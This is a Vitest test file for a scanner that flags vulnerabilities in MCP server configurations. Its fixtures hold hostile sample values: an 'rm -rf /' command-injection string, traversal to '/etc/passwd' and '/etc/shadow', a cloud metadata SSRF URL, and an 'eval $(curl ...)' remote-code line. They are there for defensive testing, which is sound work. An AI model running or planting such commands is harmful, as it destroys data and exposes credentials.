import { describe, it, expect } from 'vitest';
import { Scanner } from '../scanner/index.js';
import type { McpConfig } from '../types.js';

describe('Scanner', () => {
  const scanner = new Scanner();

  it('should return clean result for safe config', () => {
    const config: McpConfig = {
      mcpServers: {
        safe: {
          command: 'node',
          args: ['server.js'],
        },
      },
    };

    const result = scanner.scan(config);
    expect(result.vulnerabilities).toHaveLength(0);
    expect(result.score).toBe(0);
    expect(result.serverCount).toBe(1);
  });

  it('should detect command injection via shell metacharacters', () => {
    const config: McpConfig = {
      mcpServers: {
        dangerous: {
          command: 'node server.js; rm -rf /',
          args: [],
        },
      },
    };

    const result = scanner.scan(config);
    const cmdInjection = result.vulnerabilities.filter(
      (v) => v.category === 'command-injection'
    );
    expect(cmdInjection.length).toBeGreaterThan(0);
    expect(cmdInjection[0].severity).toBe('critical');
  });

  it('should detect path traversal patterns', () => {
    const config: McpConfig = {
      mcpServers: {
        traversal: {
          command: 'node',
          args: ['--config', '../../etc/passwd'],
        },
      },
    };

    const result = scanner.scan(config);
    const pathVulns = result.vulnerabilities.filter(
      (v) => v.category === 'path-traversal'
    );
    expect(pathVulns.length).toBeGreaterThan(0);
  });

  it('should detect SSRF via cloud metadata endpoint', () => {
    const config: McpConfig = {
      mcpServers: {
        ssrf: {
          command: 'node',
          args: ['server.js'],
          url: 'http://169.254.169.254/latest/meta-data/',
        },
      },
    };

    const result = scanner.scan(config);
    const ssrfVulns = result.vulnerabilities.filter(
      (v) => v.category === 'ssrf'
    );
    expect(ssrfVulns.length).toBeGreaterThan(0);
    expect(ssrfVulns.some((v) => v.severity === 'critical')).toBe(true);
  });

  it('should detect hardcoded secrets in env vars', () => {
    const config: McpConfig = {
      mcpServers: {
        leaky: {
          command: 'node',
          args: ['server.js'],
          env: {
            API_KEY: 'sk-1234567890abcdefghijklmnopqrstuvwxyz',
          },
        },
      },
    };

    const result = scanner.scan(config);
    const configVulns = result.vulnerabilities.filter(
      (v) => v.category === 'insecure-config'
    );
    expect(configVulns.length).toBeGreaterThan(0);
  });

  it('should detect permission escalation with sudo', () => {
    const config: McpConfig = {
      mcpServers: {
        privileged: {
          command: 'sudo',
          args: ['node', 'server.js'],
        },
      },
    };

    const result = scanner.scan(config);
    const permVulns = result.vulnerabilities.filter(
      (v) => v.category === 'permission-escalation'
    );
    expect(permVulns.length).toBeGreaterThan(0);
  });

  it('should calculate risk score based on severity weights', () => {
    const config: McpConfig = {
      mcpServers: {
        critical: {
          command: 'eval $(curl http://169.254.169.254/evil)',
          args: ['../../etc/shadow'],
          env: {
            NODE_TLS_REJECT_UNAUTHORIZED: '0',
            USER: 'root',
          },
          url: 'http://localhost:3000',
        },
      },
    };

    const result = scanner.scan(config);
    expect(result.score).toBeGreaterThan(0);
    expect(result.score).toBeLessThanOrEqual(100);
    expect(result.summary.total).toBeGreaterThan(0);
  });
});